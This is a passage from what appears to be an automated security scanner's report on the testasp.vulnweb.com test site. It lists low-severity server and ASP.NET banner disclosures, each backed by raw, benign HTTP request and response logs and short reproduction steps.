- Impact (engine-assessed): indicated — Technology stack disclosed — reconnaissance aid.
- Evidence chain (engine-recorded):
    * [header_value] X-Powered-By: ASP.NET
- RAW reproduction (from the scan's request journal, verbatim):
  --- RAW REQUEST req-92a1d0ed (exactly as issued by the engine) ---
  GET /Default.asp
  headers:
    Cookie: [REDACTED]
    User-Agent: Mozilla/5.0 (compatible; Sentinel/4.2.1; +security-scanner)
  body:
    (empty)
  --- RAW RESPONSE (final, after redirect hops) ---
  HTTP 200
  headers:
    cache-control: private
    content-length: 3538
    content-type: text/html
    date: Sat, 03 Oct 2026 01:15:40 GMT
    server: Microsoft-IIS/8.5
    x-powered-by: ASP.NET
  body:
    \x0d
    <!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN" "http://www.w3.org/TR/html4/loose.dtd">\x0d
    <html><!-- InstanceBegin template="/Templates/MainTemplate.dwt.asp" codeOutsideHTMLIsLocked="false" -->\x0d
    <head>\x0d
    <!-- InstanceBeginEditable name="doctitle" -->\x0d
    <title>acuforum forums</title>\x0d
    <!-- InstanceEndEditable -->\x0d
    <meta http-equiv="Content-Type" content="text/html; charset=iso-8859-1">\x0d
    <!-- InstanceBeginEditable name="head" -->\x0d
    <!-- InstanceEndEditable -->\x0d
    <link href="styles.css" rel="stylesheet" type="text/css">\x0d
    </head>\x0d
    ... [33 more lines, 3672 chars total]
  elapsed_ms: 351.9
- Evidence-OS reproduction recipe:
    1. authenticate a session with the application (as configured for the scan)
       expect: an authenticated session cookie/header
    2. send GET http://testasp.vulnweb.com/Default.asp as recorded
       expect: the same evidence kind fires as in the attached proof (header_value)

## [TESTASP F25] server_banner_disclosure — low (engine verdict: verified)

- Surface: GET http://testasp.vulnweb.com/Search.asp (parameter: ``)
- Engine verdict: verified via `single-response-evidence` | confidence 0.7 | rounds 1
- Verification notes (engine-recorded): presence-based proof (weakest evidence class in the engine): established from ONE response — no replay oracle exists for this class by nature
- Impact (engine-assessed): indicated — Server software version disclosed — reconnaissance aid.
- Evidence chain (engine-recorded):
    * [header_value] Server: Microsoft-IIS/8.5
    * [header_value] Server: Microsoft-IIS/8.5
    * [header_value] Server: Microsoft-IIS/8.5
- RAW reproduction (from the scan's request journal, verbatim):
  --- RAW REQUEST req-ec2c1214 (exactly as issued by the engine) ---
  GET /Search.asp
  headers:
    Cookie: [REDACTED]
    User-Agent: Mozilla/5.0 (compatible; Sentinel/4.2.1; +security-scanner)
  body:
    (empty)
  --- RAW RESPONSE (final, after redirect hops) ---
  HTTP 200
  headers:
    cache-control: private
    content-length: 2809
    content-type: text/html
    date: Sat, 03 Oct 2026 01:15:41 GMT
    server: Microsoft-IIS/8.5
    x-powered-by: ASP.NET
  body:
    \x0d
    <!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN" "http://www.w3.org/TR/html4/loose.dtd">\x0d
    <html><!-- InstanceBegin template="/Templates/MainTemplate.dwt.asp" codeOutsideHTMLIsLocked="false" -->\x0d
    <head>\x0d
    <!-- InstanceBeginEditable name="doctitle" -->\x0d
    <title>acuforum search</title>\x0d
    <!-- InstanceEndEditable -->\x0d
    <meta http-equiv="Content-Type" content="text/html; charset=iso-8859-1">\x0d
    <!-- InstanceBeginEditable name="head" --><!-- InstanceEndEditable -->\x0d
    <link href="styles.css" rel="stylesheet" type="text/css">\x0d
    </head>\x0d
    <body> \x0d
    ... [31 more lines, 2937 chars total]
  elapsed_ms: 338.2
  --- RAW REQUEST req-c38cfbfb (exactly as issued by the engine) ---
  GET /Search.asp?tfSearch=1
  headers:
    Cookie: [REDACTED]
    User-Agent: Mozilla/5.0 (compatible; Sentinel/4.2.1; +security-scanner)
  body:
    (empty)
  --- RAW RESPONSE (final, after redirect hops) ---
  HTTP 200
  headers:
    cache-control: private
    content-length: 3718
    content-type: text/html
    date: Sat, 03 Oct 2026 01:16:29 GMT
    server: Microsoft-IIS/8.5
    x-powered-by: ASP.NET
  body:
    \x0d
    <!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN" "http://www.w3.org/TR/html4/loose.dtd">\x0d
    <html><!-- InstanceBegin template="/Templates/MainTemplate.dwt.asp" codeOutsideHTMLIsLocked="false" -->\x0d
    <head>\x0d
    <!-- InstanceBeginEditable name="doctitle" -->\x0d
    <title>acuforum search</title>\x0d
    <!-- InstanceEndEditable -->\x0d
    <meta http-equiv="Content-Type" content="text/html; charset=iso-8859-1">\x0d
    <!-- InstanceBeginEditable name="head" --><!-- InstanceEndEditable -->\x0d
    <link href="styles.css" rel="stylesheet" type="text/css">\x0d
    </head>\x0d
    <body> \x0d
    ... [31 more lines, 3846 chars total]
  elapsed_ms: 356.4
  --- RAW REQUEST req-55443d46 (exactly as issued by the engine) ---
  GET /Search.asp?tfSearch=1&tfSearch=
  headers:
    Cookie: [REDACTED]
    User-Agent: Mozilla/5.0 (compatible; Sentinel/4.2.1; +security-scanner)
  body:
    (empty)
  --- RAW RESPONSE (final, after redirect hops) ---
  HTTP 500
  headers:
    cache-control: private
    content-length: 1208
    content-type: text/html
    date: Sat, 03 Oct 2026 01:19:43 GMT
    server: Microsoft-IIS/8.5
    x-powered-by: ASP.NET
  body:
    <!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Strict//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-strict.dtd">\x0d
    <html xmlns="http://www.w3.org/1999/xhtml">\x0d
    <head>\x0d
    <meta http-equiv="Content-Type" content="text/html; charset=iso-8859-1"/>\x0d
    <title>500 - Internal server error.</title>\x0d
    <style type="text/css">\x0d
    <!--\x0d
    body{margin:0;font-size:.7em;font-family:Verdana, Arial, Helvetica, sans-serif;background:#EEEEEE;}\x0d
    fieldset{padding:0 15px 10px 15px;} \x0d
    h1{font-size:2.4em;margin:0;color:#FFF;}\x0d
    h2{font-size:1.7em;margin:0;color:#CC0000;} \x0d
    h3{font-size:1.2em;margin:10px 0 0 0;color:#000000;} \x0d
    ... [17 more lines, 1294 chars total]
  elapsed_ms: 363.7
- Evidence-OS reproduction recipe:
    1. authenticate a session with the application (as configured for the scan)
       expect: an authenticated session cookie/header
    2. send GET http://testasp.vulnweb.com/Search.asp as recorded
       expect: the same evidence kind fires as in the attached proof (header_value)

## [TESTASP F26] tech_banner_disclosure — low (engine verdict: verified)

- Surface: GET http://testasp.vulnweb.com/Search.asp (parameter: ``)
- Engine verdict: verified via `single-response-evidence` | confidence 0.7 | rounds 1
- Verification notes (engine-recorded): presence-based proof (weakest evidence class in the engine): established from ONE response — no replay oracle exists for this class by nature
- Impact (engine-assessed): indicated — Technology stack disclosed — reconnaissance aid.
- Evidence chain (engine-recorded):
    * [header_value] X-Powered-By: ASP.NET
    * [header_value] X-Powered-By: ASP.NET
    * [header_value] X-Powered-By: ASP.NET
- RAW reproduction (from the scan's request journal, verbatim):
  --- RAW REQUEST req-ec2c1214 (exactly as issued by the engine) ---
  GET /Search.asp
  headers:
    Cookie: [REDACTED]
    User-Agent: Mozilla/5.0 (compatible; Sentinel/4.2.1; +security-scanner)
  body:
    (empty)
  --- RAW RESPONSE (final, after redirect hops) ---
  HTTP 200
  headers:
    cache-control: private
    content-length: 2809
    content-type: text/html
    date: Sat, 03 Oct 2026 01:15:41 GMT
    server: Microsoft-IIS/8.5
    x-powered-by: ASP.NET
  body:
    \x0d
    <!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN" "http://www.w3.org/TR/html4/loose.dtd">\x0d
    <html><!-- InstanceBegin template="/Templates/MainTemplate.dwt.asp" codeOutsideHTMLIsLocked="false" -->\x0d
    <head>\x0d
    <!-- InstanceBeginEditable name="doctitle" -->\x0d
    <title>acuforum search</title>\x0d
    <!-- InstanceEndEditable -->\x0d
    <meta http-equiv="Content-Type" content="text/html; charset=iso-8859-1">\x0d
    <!-- InstanceBeginEditable name="head" --><!-- InstanceEndEditable -->\x0d
    <link href="styles.css" rel="stylesheet" type="text/css">\x0d
    </head>\x0d
    <body> \x0d
    ... [31 more lines, 2937 chars total]
  elapsed_ms: 338.2
  --- RAW REQUEST req-c38cfbfb (exactly as issued by the engine) ---
  GET /Search.asp?tfSearch=1
  headers:
    Cookie: [REDACTED]
    User-Agent: Mozilla/5.0 (compatible; Sentinel/4.2.1; +security-scanner)
  body:
    (empty)
  --- RAW RESPONSE (final, after redirect hops) ---
  HTTP 200
  headers:
    cache-control: private
    content-length: 3718
    content-type: text/html
    date: Sat, 03 Oct 2026 01:16:29 GMT
    server: Microsoft-IIS/8.5
    x-powered-by: ASP.NET
  body:
    \x0d
    <!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN" "http://www.w3.org/TR/html4/loose.dtd">\x0d
    <html><!-- InstanceBegin template="/Templates/MainTemplate.dwt.asp" codeOutsideHTMLIsLocked="false" -->\x0d
    <head>\x0d
    <!-- InstanceBeginEditable name="doctitle" -->\x0d
    <title>acuforum search</title>\x0d
    <!-- InstanceEndEditable -->\x0d
    <meta http-equiv="Content-Type" content="text/html; charset=iso-8859-1">\x0d
    <!-- InstanceBeginEditable name="head" --><!-- InstanceEndEditable -->\x0d
    <link href="styles.css" rel="stylesheet" type="text/css">\x0d
    </head>\x0d
    <body> \x0d
    ... [31 more lines, 3846 chars total]
  elapsed_ms: 356.4
  --- RAW REQUEST req-55443d46 (exactly as issued by the engine) ---
  GET /Search.asp?tfSearch=1&tfSearch=
  headers:
    Cookie: [REDACTED]
    User-Agent: Mozilla/5.0 (compatible; Sentinel/4.2.1; +security-scanner)
  body:
    (empty)
  --- RAW RESPONSE (final, after redirect hops) ---
  HTTP 500
  headers:
    cache-control: private
    content-length: 1208
    content-type: text/html
    date: Sat, 03 Oct 2026 01:19:43 GMT
    server: Microsoft-IIS/8.5
    x-powered-by: ASP.NET
  body:
    <!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Strict//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-strict.dtd">\x0d
    <html xmlns="http://www.w3.org/1999/xhtml">\x0d
    <head>\x0d
    <meta http-equiv="Content-Type" content="text/html; charset=iso-8859-1"/>\x0d
    <title>500 - Internal server error.</title>\x0d
    <style type="text/css">\x0d
    <!--\x0d
    body{margin:0;font-size:.7em;font-family:Verdana, Arial, Helvetica, sans-serif;background:#EEEEEE;}\x0d
    fieldset{padding:0 15px 10px 15px;} \x0d
    h1{font-size:2.4em;margin:0;color:#FFF;}\x0d
    h2{font-size:1.7em;margin:0;color:#CC0000;} \x0d
    h3{font-size:1.2em;margin:10px 0 0 0;color:#000000;} \x0d
    ... [17 more lines, 1294 chars total]
  elapsed_ms: 363.7
- Evidence-OS reproduction recipe:
    1. authenticate a session with the application (as configured for the scan)
       expect: an authenticated session cookie/header
    2. send GET http://testasp.vulnweb.com/Search.asp as recorded
       expect: the same evidence kind fires as in the attached proof (header_value)

## [TESTASP F27] server_banner_disclosure — low (engine verdict: verified)

- Surface: GET http://testasp.vulnweb.com/Login.asp (parameter: ``)
- Engine verdict: verified via `single-response-evidence` | confidence 0.7 | rounds 1
- Verification notes (engine-recorded): presence-based proof (weakest evidence class in the engine): established from ONE response — no replay oracle exists for this class by nature
- Impact (engine-assessed): indicated — Server software version disclosed — reconnaissance aid.
- Evidence chain (engine-recorded):
    * [header_value] Server: Microsoft-IIS/8.5
    * [header_value] Server: Microsoft-IIS/8.5
    * [header_value] Server: Microsoft-IIS/8.5
- RAW reproduction (from the scan's request journal, verbatim):
  --- RAW REQUEST req-2aacffaa (exactly as issued by the engine) ---
  GET /Login.asp?RetURL=%2Fshowforum.asp%3Fid%3D0
  headers:
    Cookie: [REDACTED]
    User-Agent: Mozilla/5.0 (compatible; Sentinel/4.2.1; +security-scanner)
  body:
    (empty)
  --- RAW RESPONSE (final, after redirect hops) ---
  HTTP 200
  headers:
    cache-control: private
    content-length: 3214
    content-type: text/html
    date: Sat, 03 Oct 2026 01:15:42 GMT
    server: Microsoft-IIS/8.5
    x-powered-by: ASP.NET
  body:
    \x0d
    <!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN" "http://www.w3.org/TR/html4/loose.dtd">\x0d
    <html><!-- InstanceBegin template="/Templates/MainTemplate.dwt.asp" codeOutsideHTMLIsLocked="false" -->\x0d
    <head>\x0d
    <!-- InstanceBeginEditable name="doctitle" -->\x0d
    <title>acuforum login</title>\x0d
    <!-- InstanceEndEditable -->\x0d
    <meta http-equiv="Content-Type" content="text/html; charset=iso-8859-1">\x0d
    <!-- InstanceBeginEditable name="head" -->\x0d
    <!-- InstanceEndEditable -->\x0d
    <link href="styles.css" rel="stylesheet" type="text/css">\x0d
    </head>\x0d
    ... [42 more lines, 3375 chars total]
  elapsed_ms: 344.8
  --- RAW REQUEST req-29af1125 (exactly as issued by the engine) ---
  POST /Login.asp?RetURL=%2FDefault.asp%3F
  headers:
    Content-Type: application/x-www-form-urlencoded
    Cookie: [REDACTED]
    User-Agent: Mozilla/5.0 (compatible; Sentinel/4.2.1; +security-scanner)
  body:
    tfUName=&tfUPass=
  --- RAW RESPONSE (final, after redirect hops) ---
  HTTP 200
  headers:
    cache-control: private
    content-length: 3198
    content-type: text/html
    date: Sat, 03 Oct 2026 01:16:43 GMT
    server: Microsoft-IIS/8.5
    x-powered-by: ASP.NET
  body:
    \x0d
    <!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN" "http://www.w3.org/TR/html4/loose.dtd">\x0d
    <html><!-- InstanceBegin template="/Templates/MainTemplate.dwt.asp" codeOutsideHTMLIsLocked="false" -->\x0d
    <head>\x0d
    <!-- InstanceBeginEditable name="doctitle" -->\x0d
    <title>acuforum login</title>\x0d
    <!-- InstanceEndEditable -->\x0d
    <meta http-equiv="Content-Type" content="text/html; charset=iso-8859-1">\x0d
    <!-- InstanceBeginEditable name="head" -->\x0d
    <!-- InstanceEndEditable -->\x0d
    <link href="styles.css" rel="stylesheet" type="text/css">\x0d
    </head>\x0d
    ... [42 more lines, 3359 chars total]
  elapsed_ms: 331.3
  --- RAW REQUEST req-0dada91e (exactly as issued by the engine) ---
  POST /Login.asp
  headers:
    Content-Type: application/x-www-form-urlencoded
    Cookie: [REDACTED]
    User-Agent: Mozilla/5.0 (compatible; Sentinel/4.2.1; +security-scanner)
  body:
    tfUName=&tfUPass=
  --- RAW RESPONSE (final, after redirect hops) ---
  HTTP 200
  headers:
    cache-control: private
    content-length: 3127
    content-type: text/html
    date: Sat, 03 Oct 2026 01:20:07 GMT
    server: Microsoft-IIS/8.5
    x-powered-by: ASP.NET
  body:
    \x0d
    <!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN" "http://www.w3.org/TR/html4/loose.dtd">\x0d
    <html><!-- InstanceBegin template="/Templates/MainTemplate.dwt.asp" codeOutsideHTMLIsLocked="false" -->\x0d
    <head>\x0d
    <!-- InstanceBeginEditable name="doctitle" -->\x0d
    <title>acuforum login</title>\x0d
    <!-- InstanceEndEditable -->\x0d
    <meta http-equiv="Content-Type" content="text/html; charset=iso-8859-1">\x0d
    <!-- InstanceBeginEditable name="head" -->\x0d
    <!-- InstanceEndEditable -->\x0d
    <link href="styles.css" rel="stylesheet" type="text/css">\x0d
    </head>\x0d
    ... [42 more lines, 3288 chars total]
  elapsed_ms: 325.1
- Evidence-OS reproduction recipe:
    1. authenticate a session with the application (as configured for the scan)
       expect: an authenticated session cookie/header
    2. send GET http://testasp.vulnweb.com/Login.asp as recorded
       expect: the same evidence kind fires as in the attached proof (header_value)

## [TESTASP F28] tech_banner_disclosure — low (engine verdict: verified)

- Surface: GET http://testasp.vulnweb.com/Login.asp (parameter: ``)
- Engine verdict: verified via `single-response-evidence` | confidence 0.7 | rounds 1
- Verification notes (engine-recorded): presence-based proof (weakest evidence class in the engine): established from ONE response — no replay oracle exists for this class by nature
- Impact (engine-assessed): indicated — Technology stack disclosed — reconnaissance aid.
- Evidence chain (engine-recorded):
    * [header_value] X-Powered-By: ASP.NET
    * [header_value] X-Powered-By: ASP.NET
    * [header_value] X-Powered-By: ASP.NET
- RAW reproduction (from the scan's request journal, verbatim):
  --- RAW REQUEST req-2aacffaa (exactly as issued by the engine) ---
  GET /Login.asp?RetURL=%2Fshowforum.asp%3Fid%3D0
  headers:
    Cookie: [REDACTED]
    User-Agent: Mozilla/5.0 (compatible; Sentinel/4.2.1; +security-scanner)
  body:
    (empty)
  --- RAW RESPONSE (final, after redirect hops) ---
  HTTP 200
  headers:
    cache-control: private
    content-length: 3214
    content-type: text/html
    date: Sat, 03 Oct 2026 01:15:42 GMT
    server: Microsoft-IIS/8.5
    x-powered-by: ASP.NET
  body:
    \x0d
    <!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN" "http://www.w3.org/TR/html4/loose.dtd">\x0d
    <html><!-- InstanceBegin template="/Templates/MainTemplate.dwt.asp" codeOutsideHTMLIsLocked="false" -->\x0d
    <head>\x0d
    <!-- InstanceBeginEditable name="doctitle" -->\x0d
    <title>acuforum login</title>\x0d
    <!-- InstanceEndEditable -->\x0d
    <meta http-equiv="Content-Type" content="text/html; charset=iso-8859-1">\x0d
    <!-- InstanceBeginEditable name="head" -->\x0d
    <!-- InstanceEndEditable -->\x0d
    <link href="styles.css" rel="stylesheet" type="text/css">\x0d
    </head>\x0d
    ... [42 more lines, 3375 chars total]
  elapsed_ms: 344.8
  --- RAW REQUEST req-29af1125 (exactly as issued by the engine) ---
  POST /Login.asp?RetURL=%2FDefault.asp%3F
  headers:
    Content-Type: application/x-www-form-urlencoded
    Cookie: [REDACTED]
    User-Agent: Mozilla/5.0 (compatible; Sentinel/4.2.1; +security-scanner)
  body:
    tfUName=&tfUPass=
  --- RAW RESPONSE (final, after redirect hops) ---
  HTTP 200
  headers:
    cache-control: private
    content-length: 3198
    content-type: text/html
    date: Sat, 03 Oct 2026 01:16:43 GMT
    server: Microsoft-IIS/8.5
    x-powered-by: ASP.NET
  body:
    \x0d
    <!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN" "http://www.w3.org/TR/html4/loose.dtd">\x0d
    <html><!-- InstanceBegin template="/Templates/MainTemplate.dwt.asp" codeOutsideHTMLIsLocked="false" -->\x0d
    <head>\x0d
    <!-- InstanceBeginEditable name="doctitle" -->\x0d
    <title>acuforum login</title>\x0d
    <!-- InstanceEndEditable -->\x0d
    <meta http-equiv="Content-Type" content="text/html; charset=iso-8859-1">\x0d
    <!-- InstanceBeginEditable name="head" -->\x0d
    <!-- InstanceEndEditable -->\x0d
    <link href="styles.css" rel="stylesheet" type="text/css">\x0d
    </head>\x0d
    ... [42 more lines, 3359 chars total]
  elapsed_ms: 331.3
  --- RAW REQUEST req-0dada91e (exactly as issued by the engine) ---
  POST /Login.asp
  headers:
    Content-Type: application/x-www-form-urlencoded
    Cookie: [REDACTED]
    User-Agent: Mozilla/5.0 (compatible; Sentinel/4.2.1; +security-scanner)
  body:
    tfUName=&tfUPass=
  --- RAW RESPONSE (final, after redirect hops) ---
  HTTP 200
  headers:
    cache-control: private
    content-length: 3127
    content-type: text/html
    date: Sat, 03 Oct 2026 01:20:07 GMT
    server: Microsoft-IIS/8.5
    x-powered-by: ASP.NET
  body:
    \x0d
    <!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN" "http://www.w3.org/TR/html4/loose.dtd">\x0d
    <html><!-- InstanceBegin template="/Templates/MainTemplate.dwt.asp" codeOutsideHTMLIsLocked="false" -->\x0d
    <head>\x0d
    <!-- InstanceBeginEditable name="doctitle" -->\x0d
    <title>acuforum login</title>\x0d
    <!-- InstanceEndEditable -->\x0d
    <meta http-equiv="Content-Type" content="text/html; charset=iso-8859-1">\x0d
    <!-- InstanceBeginEditable name="head" -->\x0d
    <!-- InstanceEndEditable -->\x0d
    <link href="styles.css" rel="stylesheet" type="text/css">\x0d
    </head>\x0d
    ... [42 more lines, 3288 chars total]
  elapsed_ms: 325.1
- Evidence-OS reproduction recipe:
    1. authenticate a session with the application (as configured for the scan)
       expect: an authenticated session cookie/header
    2. send GET http://testasp.vulnweb.com/Login.asp as recorded
       expect: the same evidence kind fires as in the attached proof (header_value)

## [TESTASP F29] server_banner_disclosure — low (engine verdict: verified)

- Surface: GET http://testasp.vulnweb.com/Register.asp (parameter: ``)
- Engine verdict: verified via `single-response-evidence` | confidence 0.7 | rounds 1
- Verification notes (engine-recorded): presence-based proof (weakest evidence class in the engine): established from ONE response — no replay oracle exists for this class by nature
- Impact (engine-assessed): indicated — Server software version disclosed — reconnaissance aid.
- Evidence chain (engine-recorded):
    * [header_value] Server: Microsoft-IIS/8.5
    * [header_value] Server: Microsoft-IIS/8.5
    * [header_value] Server: Microsoft-IIS/8.5
- RAW reproduction (from the scan's request journal, verbatim):
  --- RAW REQUEST req-cdd2a366 (exactly as issued by the engine) ---
  GET /Register.asp?RetURL=%2Fshowforum.asp%3Fid%3D0
  headers:
    Cookie: [REDACTED]
    User-Agent: Mozilla/5.0 (compatible; Sentinel/4.2.1; +security-scanner)
  body:
    (empty)
  --- RAW RESPONSE (final, after redirect hops) ---
  HTTP 200
  headers:
    cache-control: private
    content-length: 3631
    content-type: text/html
    date: Sat, 03 Oct 2026 01:16:04 GMT
    server: Microsoft-IIS/8.5
    x-powered-by: ASP.NET
  body:
    \x0d
    <!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN" "http://www.w3.org/TR/html4/loose.dtd">\x0d
    <html><!-- InstanceBegin template="/Templates/MainTemplate.dwt.asp" codeOutsideHTMLIsLocked="false" -->\x0d
    <head>\x0d
    <!-- InstanceBeginEditable name="doctitle" -->\x0d
    <title>acuforum register</title>\x0d
    <!-- InstanceEndEditable -->\x0d
    <meta http-equiv="Content-Type" content="text/html; charset=iso-8859-1">\x0d
    <!-- InstanceBeginEditable name="head" -->\x0d
    <!-- InstanceEndEditable -->\x0d
    <link href="styles.css" rel="stylesheet" type="text/css">\x0d
    </head>\x0d
    ... [49 more lines, 3813 chars total]
  elapsed_ms: 356.6
  --- RAW REQUEST req-76decf28 (exactly as issued by the engine) ---
  POST /Register.asp?RetURL=%2FDefault.asp%3F
  headers:
    Content-Type: application/x-www-form-urlencoded
    Cookie: [REDACTED]
    User-Agent: Mozilla/5.0 (compatible; Sentinel/4.2.1; +security-scanner)
  body:
    tfUName=&tfRName=&tfEmail=&tfUPass=
  --- RAW RESPONSE (final, after redirect hops) ---
  HTTP 200
  headers:
    cache-control: private
    content-length: 3546
    content-type: text/html
    date: Sat, 03 Oct 2026 01:17:50 GMT
    server: Microsoft-IIS/8.5
    x-powered-by: ASP.NET
  body:
    \x0d
    <!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN" "http://www.w3.org/TR/html4/loose.dtd">\x0d
    <html><!-- InstanceBegin template="/Templates/MainTemplate.dwt.asp" codeOutsideHTMLIsLocked="false" -->\x0d
    <head>\x0d
    <!-- InstanceBeginEditable name="doctitle" -->\x0d
    <title>acuforum register</title>\x0d
    <!-- InstanceEndEditable -->\x0d
    <meta http-equiv="Content-Type" content="text/html; charset=iso-8859-1">\x0d
    <!-- InstanceBeginEditable name="head" -->\x0d
    <!-- InstanceEndEditable -->\x0d
    <link href="styles.css" rel="stylesheet" type="text/css">\x0d
    </head>\x0d
    ... [49 more lines, 3728 chars total]
  elapsed_ms: 366.0
  --- RAW REQUEST req-24853284 (exactly as issued by the engine) ---
  POST /Register.asp
  headers:
    Content-Type: application/x-www-form-urlencoded
    Cookie: [REDACTED]
    User-Agent: Mozilla/5.0 (compatible; Sentinel/4.2.1; +security-scanner)
  body:
    tfUName=&tfRName=&tfEmail=&tfUPass=
  --- RAW RESPONSE (final, after redirect hops) ---
  HTTP 200
  headers:
    cache-control: private
    content-length: 3545
    content-type: text/html
    date: Sat, 03 Oct 2026 01:21:05 GMT
    server: Microsoft-IIS/8.5
    x-powered-by: ASP.NET
  body:
    \x0d
    <!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN" "http://www.w3.org/TR/html4/loose.dtd">\x0d
    <html><!-- InstanceBegin template="/Templates/MainTemplate.dwt.asp" codeOutsideHTMLIsLocked="false" -->\x0d
    <head>\x0d
    <!-- InstanceBeginEditable name="doctitle" -->\x0d
    <title>acuforum register</title>\x0d
    <!-- InstanceEndEditable -->\x0d
    <meta http-equiv="Content-Type" content="text/html; charset=iso-8859-1">\x0d
    <!-- InstanceBeginEditable name="head" -->\x0d
    <!-- InstanceEndEditable -->\x0d
    <link href="styles.css" rel="stylesheet" type="text/css">\x0d
    </head>\x0d
    ... [49 more lines, 3727 chars total]
  elapsed_ms: 318.5
- Evidence-OS reproduction recipe:
    1. authenticate a session with the application (as configured for the scan)
       expect: an authenticated session cookie/header
    2. send GET http://testasp.vulnweb.com/Register.asp as recorded
       expect: the same evidence kind fires as in the attached proof (header_value)

## [TESTASP F30] tech_banner_disclosure — low (engine verdict: verified)

- Surface: GET http://testasp.vulnweb.com/Register.asp (parameter: ``)
- Engine verdict: verified via `single-response-evidence` | confidence 0.7 | rounds 1
- Verification notes (engine-recorded): presence-based proof (weakest evidence class in the engine): established from ONE response — no replay oracle exists for this class by nature
- Impact (engine-assessed): indicated — Technology stack disclosed — reconnaissance aid.
- Evidence chain (engine-recorded):
    * [header_value] X-Powered-By: ASP.NET
    * [header_value] X-Powered-By: ASP.NET
    * [header_value] X-Powered-By: ASP.NET
- RAW reproduction (from the scan's request journal, verbatim):
  --- RAW REQUEST req-cdd2a366 (exactly as issued by the engine) ---
  GET /Register.asp?RetURL=%2Fshowforum.asp%3Fid%3D0
  headers:
    Cookie: [REDACTED]
    User-Agent: Mozilla/5.0 (compatible; Sentinel/4.2.1; +security-scanner)
  body:
    (empty)
  --- RAW RESPONSE (final, after redirect hops) ---
  HTTP 200
  headers:
    cache-control: private
    content-length: 3631
    content-type: text/html
    date: Sat, 03 Oct 2026 01:16:04 GMT
    server: Microsoft-IIS/8.5
    x-powered-by: ASP.NET
  body:
    \x0d
    <!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN" "http://www.w3.org/TR/html4/loose.dtd">\x0d
    <html><!-- InstanceBegin template="/Templates/MainTemplate.dwt.asp" codeOutsideHTMLIsLocked="false" -->\x0d
    <head>\x0d
    <!-- InstanceBeginEditable name="doctitle" -->\x0d
    <title>acuforum register</title>\x0d
    <!-- InstanceEndEditable -->\x0d
    <meta http-equiv="Content-Type" content="text/html; charset=iso-8859-1">\x0d
    <!-- InstanceBeginEditable name="head" -->\x0d
    <!-- InstanceEndEditable -->\x0d
    <link href="styles.css" rel="stylesheet" type="text/css">\x0d
    </head>\x0d
    ... [49 more lines, 3813 chars total]
  elapsed_ms: 356.6
  --- RAW REQUEST req-76decf28 (exactly as issued by the engine) ---
  POST /Register.asp?RetURL=%2FDefault.asp%3F
  headers:
    Content-Type: application/x-www-form-urlencoded
    Cookie: [REDACTED]
    User-Agent: Mozilla/5.0 (compatible; Sentinel/4.2.1; +security-scanner)
  body:
    tfUName=&tfRName=&tfEmail=&tfUPass=
  --- RAW RESPONSE (final, after redirect hops) ---
  HTTP 200
  headers:
    cache-control: private
    content-length: 3546
    content-type: text/html
    date: Sat, 03 Oct 2026 01:17:50 GMT
    server: Microsoft-IIS/8.5
    x-powered-by: ASP.NET
  body:
    \x0d
    <!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN" "http://www.w3.org/TR/html4/loose.dtd">\x0d
    <html><!-- InstanceBegin template="/Templates/MainTemplate.dwt.asp" codeOutsideHTMLIsLocked="false" -->\x0d
    <head>\x0d
    <!-- InstanceBeginEditable name="doctitle" -->\x0d
    <title>acuforum register</title>\x0d
    <!-- InstanceEndEditable -->\x0d
    <meta http-equiv="Content-Type" content="text/html; charset=iso-8859-1">\x0d
    <!-- InstanceBeginEditable name="head" -->\x0d
    <!-- InstanceEndEditable -->\x0d
    <link href="styles.css" rel="stylesheet" type="text/css">\x0d
    </head>\x0d
    ... [49 more lines, 3728 chars total]
  elapsed_ms: 366.0
  --- RAW REQUEST req-24853284 (exactly as issued by the engine) ---
  POST /Register.asp
  headers:
    Content-Type: application/x-www-form-urlencoded
    Cookie: [REDACTED]
    User-Agent: Mozilla/5.0 (compatible; Sentinel/4.2.1; +security-scanner)
  body:
    tfUName=&tfRName=&tfEmail=&tfUPass=
  --- RAW RESPONSE (final, after redirect hops) ---
  HTTP 200
  headers:
    cache-control: private
    content-length: 3545
    content-type: text/html
    date: Sat, 03 Oct 2026 01:21:05 GMT
    server: Microsoft-IIS/8.5
    x-powered-by: ASP.NET
  body:
    \x0d
    <!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN" "http://www.w3.org/TR/html4/loose.dtd">\x0d
    <html><!-- InstanceBegin template="/Templates/MainTemplate.dwt.asp" codeOutsideHTMLIsLocked="false" -->\x0d
    <head>\x0d
    <!-- InstanceBeginEditable name="doctitle" -->\x0d
    <title>acuforum register</title>\x0d
    <!-- InstanceEndEditable -->\x0d
    <meta http-equiv="Content-Type" content="text/html; charset=iso-8859-1">\x0d
    <!-- InstanceBeginEditable name="head" -->\x0d
    <!-- InstanceEndEditable -->\x0d
    <link href="styles.css" rel="stylesheet" type="text/css">\x0d
    </head>\x0d
    ... [49 more lines, 3727 chars total]
  elapsed_ms: 318.5
- Evidence-OS reproduction recipe:
    1. authenticate a session with the application (as configured for the scan)
       expect: an authenticated session cookie/header
    2. send GET http://testasp.vulnweb.com/Register.asp as recorded
       expect: the same evidence kind fires as in the attached proof (header_value)

